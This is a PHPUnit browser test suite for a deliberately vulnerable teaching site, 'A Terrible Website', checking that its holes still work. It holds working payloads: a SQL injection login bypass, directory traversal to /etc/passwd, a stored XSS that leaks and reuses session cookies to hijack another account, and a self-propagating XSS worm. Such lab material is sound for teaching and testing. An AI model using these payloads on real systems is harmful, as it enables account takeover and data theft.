<?php
class VulnerabilitiesTest extends PHPUnit_Framework_TestCase {

    /**
     * @var \RemoteWebDriver
     */
    protected $webDriver;

    public function setUp()
    {
        $capabilities = array(\WebDriverCapabilityType::BROWSER_NAME => 'phantomjs');
        $this->webDriver = RemoteWebDriver::create('http://localhost:4444/wd/hub', $capabilities);
    }

    protected $url = 'http://127.0.0.1:80/';

    private function loginAs($username, $password) {
        $this->webDriver->get($this->url . "?page=login.php");
        $usernameField = $this->webDriver->findElement(WebDriverBy::name('username'));
        $usernameField->sendKeys($username);
        $passwordField = $this->webDriver->findElement(WebDriverBy::name('password'));
        $passwordField->sendKeys($password)->submit();
    }

    private function logout() {
        $this->webDriver->get($this->url . "?page=logout.php");
    }

    public function testHomePage()
    {
        $this->webDriver->get($this->url);
        $this->assertContains('A Terrible Website', $this->webDriver->getTitle());
        $this->assertContains('Register', $this->webDriver->getPageSource());
        $this->assertContains('Login', $this->webDriver->getPageSource());
        $this->assertContains('Search', $this->webDriver->getPageSource());
    }

    public function testLoginHashed()
    {
        $this->loginAs('b001', 'godzilla');
        $this->assertContains('Hi, <strong>b001</strong>', $this->webDriver->getPageSource());
    }

    public function testAdminSQLInjectionLogin()
    {
        $this->webDriver->get($this->url . "?page=login.php");
        $usernameField = $this->webDriver->findElement(WebDriverBy::name('username'));
        $usernameField->sendKeys("admin' OR 2=1 OR 'a'='")->submit();
        $this->assertContains('Hi, <strong>admin</strong>', $this->webDriver->getPageSource());
    }

    public function testSQLInjectionError()
    {
        $this->webDriver->get($this->url . "?page=login.php");
        $usernameField = $this->webDriver->findElement(WebDriverBy::name('username'));
        $usernameField->sendKeys("admin'")->submit();
        $this->assertContains('SQL Error', $this->webDriver->getPageSource());
        $this->assertContains('You have an error in your SQL syntax', $this->webDriver->getPageSource());
    }

    public function testDirectoryTraversal()
    {
        $this->webDriver->get($this->url . "?page=../../etc/passwd");
        $vulnerablePasswdFile1 = strpos($this->webDriver->getPageSource(), 'root') !== false;

        $this->webDriver->get($this->url . "?page=../../../etc/passwd");
        $vulnerablePasswdFile2 = strpos($this->webDriver->getPageSource(), 'root') !== false;

        $this->webDriver->get($this->url . "?page=../LICENSE.txt");
        $vulnerableLicense = strpos($this->webDriver->getPageSource(), 'All rights reserved') !== false;

        $this->assertTrue($vulnerablePasswdFile1 or $vulnerablePasswdFile2 or $vulnerableLicense);
    }

    public function testDirectoryTraversalWithNullByte()
    {

        $this->markTestIncomplete(
            'Null-byte injection does not work yet.'
        );
        $this->webDriver->get($this->url . "?page=../../etc/passwd\x00something");
        $vulnerablePasswdFile1 = strpos($this->webDriver->getPageSource(), 'root') !== false;

        $this->webDriver->get($this->url . "?page=../../../etc/passwd\x00something");
        $vulnerablePasswdFile2 = strpos($this->webDriver->getPageSource(), 'root') !== false;

        $this->webDriver->get($this->url . "?page=../LICENSE.txt\x00something");
        $vulnerableLicense = strpos($this->webDriver->getPageSource(), 'All rights reserved') !== false;

        $this->assertTrue($vulnerablePasswdFile1 or $vulnerablePasswdFile2 or $vulnerableLicense);
    }

    public function testXSS1()
    {
        $this->loginAs("admin", "mobydick");

        // Open the article and send the XSS Javascript script.
        $this->webDriver->get($this->url . "?page=read.php&article_id=2");
        $commentField = $this->webDriver->findElement(WebDriverBy::name('body'));
        $commentField->sendKeys("
                <script>
                    jQuery.post(
                      \"?page=comment.php\",
                      {
                        \"article_id\": 1,
                        \"body\": \"My cookies are: \" + document.cookie
                      }
                    )
                </script>
        ")->submit();
        $this->logout();

        $this->loginAs("matt", "ilikecats");
        $this->webDriver->get($this->url . "?page=read.php&article_id=2");
        sleep(1);
        $this->webDriver->manage()->deleteAllCookies(); // Don't logout, as it'd delete the session, just delete cookies

        $this->loginAs("john", "password");

        // Check that the XSS worked (leaked SID cookie)
        $this->webDriver->get($this->url . "?page=read.php&article_id=1");
        $source = $this->webDriver->getPageSource();
        $this->assertContains('PHPSESSID', $source);

        // Extract the SID
        $pattern = '/PHPSESSID=([A-Za-z0-9]+) /';
        preg_match($pattern, $source, $matches);
        $stolen_sid = $matches[1];

        // Change my own cookie
        $this->webDriver->manage()->deleteCookieNamed('PHPSESSID');
        $this->webDriver->manage()->addCookie(['name' => 'PHPSESSID', 'value' => $stolen_sid]);
        $this->webDriver->get($this->url . "?page=read.php&article_id=1");

        // Check I'm now logged in as matt
        $this->assertContains('Hi, <strong>matt</strong>', $this->webDriver->getPageSource());
    }

    public function testXSS2()
    {
        // Login as matt
        $this->loginAs("matt", "ilikecats");
        $this->webDriver->get($this->url . "?page=read.php&article_id=2");
        $commentField = $this->webDriver->findElement(WebDriverBy::name('body'));

        // Insert the evil script
        $commentField->sendKeys("
              EVILSTRING
              <script class=\"evil-script\">
                jQuery.post(
                  \"?page=comment.php\",
                  {
                    \"article_id\": 2,
                    \"body\": jQuery(\".evil-script\").first().parent().html()
                  }
                )
              </script>
        ")->submit();

        // Load the page N times
        $repeat_times = 6;
        for ($i = 0; $i < $repeat_times; $i++) {
            $this->webDriver->get($this->url . "?page=read.php&article_id=2");
            sleep(1);
        }

        // Load the page and count the occurrences of the evil string
        $source = $this->webDriver->getPageSource();
        $occurrences = substr_count($source, "EVILSTRING");

        // Check this has occurred at least N times.
        $this->assertTrue($occurrences >= $repeat_times);
    }

    public function testUsersTable() {
        $this->loginAs("admin", "mobydick");
        $this->webDriver->get($this->url . "?page=users.php");
        $this->assertContains('He\'d never give you up', $this->webDriver->getPageSource());  // check for password hint
        $this->assertContains(
            'f0d78f50ccfb95a07c19c44d8cafca4f55f3c379aed16a3cf13fbba4ee994f53',
            $this->webDriver->getPageSource());  // check for password hash
    }

    public function testRegistration() {
        $this->webDriver->get($this->url . "?page=register.php");

        $usernameField = $this->webDriver->findElement(\WebDriverBy::name("username"));
        $password1Field = $this->webDriver->findElement(\WebDriverBy::name("password1"));
        $password2Field = $this->webDriver->findElement(\WebDriverBy::name("password2"));
        $hintField = $this->webDriver->findElement(\WebDriverBy::name("hint"));
        
        $usernameField->sendKeys("alanturing");
        $password = "enigma" . rand(100, 999);
        $password1Field->sendKeys($password);
        $password2Field->sendKeys($password);
        $hintField->sendKeys("Accomplishment")->submit();

        $this->assertContains('Hi, <strong>alanturing</strong>', $this->webDriver->getPageSource());
        $this->logout();

        $this->webDriver->get($this->url . "?page=register.php");
        $usernameField = $this->webDriver->findElement(\WebDriverBy::name("username"));
        $password1Field = $this->webDriver->findElement(\WebDriverBy::name("password1"));
        $password2Field = $this->webDriver->findElement(\WebDriverBy::name("password2"));
        $hintField = $this->webDriver->findElement(\WebDriverBy::name("hint"));

        $usernameField->sendKeys("alanturing");
        $password1Field->sendKeys($password);
        $password2Field->sendKeys($password);
        $hintField->sendKeys("Accomplishment")->submit();
        $this->assertContains('The username you chose is already in use', $this->webDriver->getPageSource());

        $this->loginAs('alanturing', $password);
        $this->assertContains('Hi, <strong>alanturing</strong>', $this->webDriver->getPageSource());
    }

    public function testCodeReset() {
        if (getcwd() == '/vagrant') {
            $this->markTestIncomplete("Can't run code reset test on vagrant because of permissions.");
        }
        $this->markTestIncomplete("Unfortunately this can't be tested yet.");
        $change = "<p>Never gonna give you up, never gonna let you down</p>";
        $this->webDriver->get($this->url . "?page=tcr.php");
        $this->assertNotContains($change, $this->webDriver->getPageSource());
        system("echo \"$change\" >> pages/tcr.php 2>&1");
        sleep(1);
        $this->webDriver->get($this->url . "?page=tcr.php&refresh_me=1");
        $this->assertContains($change, $this->webDriver->getPageSource());
        $this->webDriver->get($this->url . "?page=reset.php&reset_code=1");
        var_dump($this->webDriver->getPageSource());
        $this->webDriver->get($this->url . "?page=tcr.php&refresh_me=2");
        $this->assertNotContains($change, $this->webDriver->getPageSource());
    }

    public function testDatabaseReset() {
        $this->loginAs('john', 'password');
        $change = "Never gonna make you cry, never gonna say goodbye";
        $this->webDriver->get($this->url . '?page=read.php&article_id=1');
        $commentField = $this->webDriver->findElement(WebDriverBy::name('body'));
        $commentField->sendKeys($change)->submit();
        $this->assertContains($change, $this->webDriver->getPageSource());
        $this->logout();
        $this->webDriver->get($this->url . '?page=read.php&article_id=1');
        $this->assertContains($change, $this->webDriver->getPageSource());
        $this->webDriver->get($this->url . "?page=reset.php&reset_db=1");
        $this->webDriver->get($this->url . '?page=read.php&article_id=1');
        $this->assertNotContains($change, $this->webDriver->getPageSource());

    }

    public function tearDown()
    {
        parent::tearDown();

        // Logout
        $this->logout();

        // Connect to the database
        require('./inc/configuration.php');
        require('./inc/database.php');

        // And delete all comments created in the last minute from the tests.
        $oneminuteago = time() - 60;
        $db->exec("DELETE FROM comments WHERE timestamp > $oneminuteago");
        $db->exec("DELETE FROM users WHERE username = 'alanturing'");
    }

}
